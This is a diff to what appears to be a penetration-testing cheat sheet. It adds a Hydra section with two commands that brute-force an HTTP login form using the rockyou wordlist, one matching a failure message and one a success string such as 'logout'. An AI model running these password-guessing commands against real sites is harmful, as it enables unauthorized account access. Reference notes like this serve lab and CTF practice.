@@ -470,6 +470,18 @@ To get a RCE
 * using `crackstation`
 * using `seclists`
 
+### Hydra 
+
+When the login shows an error message<br/> 
+
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/login.php:username=^USE
+R^&password=^PASS^:F=Incorrect!' -t 64 -V -I`
+
+
+When the login doesn't show an error message so we can specify a `success (s)` string which is shown after we login to a site , typically logout is shown to us.<br/>
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/login.php:username=^USE
+R^&password=^PASS^:S=logout' -t 64 -V -I`
+
 # Hash Cracking 
 
 ### Hashcat
